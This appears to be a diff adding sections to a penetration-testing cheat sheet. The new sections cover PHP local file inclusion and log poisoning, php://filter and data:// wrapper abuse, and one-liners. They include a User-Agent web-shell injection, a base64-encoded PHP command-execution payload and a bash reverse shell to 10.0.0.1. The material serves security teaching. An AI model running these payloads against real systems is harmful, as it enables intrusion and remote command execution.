@@ -196,6 +196,72 @@ Privilege escalation can be achieved by stealing cookies via XSS:
 
 Inspecting cookies in the browser's storage tab can reveal which cookies are session-related and vulnerable to theft.
 
+## Local File Inclusion (LFI) and Log Poisoning
+Local File Inclusion (LFI) vulnerabilities can be exploited to achieve Remote Code Execution (RCE) by utilizing Log Poisoning techniques. This involves injecting executable code into log files, which are then included in the application's running code, leading to the execution of the injected code.
+
+1. **Modify the User Agent**:
+   Inject a PHP code snippet into the application's log by setting a custom User Agent. The PHP code will execute any command passed to the `cmd` parameter.
+   ```bash
+   curl -H 'User-Agent: <?php system($_GET['cmd']); ?>' http://target_url
+   ```
+
+2. **Execute Commands**:
+   Trigger the execution of the injected PHP code by including the log file in a request to the vulnerable parameter (`page`). The `cmd` parameter is used to pass commands to the PHP snippet.
+   ```bash
+   curl http://target_url/page=../../../../../../../path/to/logfile&cmd=whoami
+   ```
+
+This exploitation technique demonstrates how LFI vulnerabilities can lead to significant security breaches, including Remote Code Execution, by leveraging Log Poisoning.
+
+## PHP Wrappers in File Inclusion Vulnerabilities
+
+PHP wrappers, such as `php://filter` and `data://`, offer powerful capabilities in PHP web applications. These can be utilized to bypass filters, reveal sensitive information, or even achieve code execution when exploiting File Inclusion vulnerabilities.
+
+### php://filter Wrapper
+The `php://filter` wrapper allows the contents of files, including executable PHP files, to be displayed without execution. This is particularly useful for reviewing PHP files for sensitive information or understanding the application's logic.
+
+#### Usage Example
+1. **Display File Contents**: By providing a filename to the `page` parameter, the contents can be included and displayed. However, PHP code will be executed server-side and not shown.
+    ```bash
+    curl http://target_url/page=admin.php
+    ```
+2. **Base64 Encoding**: To view the encoded contents of PHP files, the output can be encoded with base64. This is useful for bypassing certain filters or restrictions.
+    ```bash
+    curl http://target_url/page=php://filter/convert.base64-encode/resource=admin.php
+    ```
+
+### data:// Wrapper
+The `data://` wrapper allows embedding data elements as plain text or base64-encoded data in the running web application's code, facilitating code execution.
+
+#### Usage Example
+1. **Embedding URL-encoded PHP Snippets**: Embed a PHP snippet for execution within the application's code.
+    ```bash
+    curl http://target_url/page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
+    ```
+2. **Bypassing Basic Filters with Base64 Encoding**: If certain strings or code elements are filtered, encoding the PHP snippet with base64 might help in bypassing these filters.
+    ```bash
+    curl http://target_url/page=data://text/plain;base64,[base64_encoded_php_snippet]
+    ```
+
+### Caution and Considerations
+- The exploitation methods and examples provided are for educational purposes only.
+- The `data://` wrapper requires the `allow_url_include` setting to be enabled in the PHP configuration, which is not the default setting.
+- Always ensure legal and ethical considerations are adhered to when testing and exploiting vulnerabilities.
+
+
+## One-Liners
+
+### Reverse Shells
+A lot of useful examples for one-liners may be found here: [Pentest Monkey Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet/)
+```bash
+bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+```
+### Python
+Mini server:
+```bash
+python3 -m http.server 8080
+```
+
 ## Disclaimer and Legal Notice
 
 ### Ethical Considerations and Legal Compliance
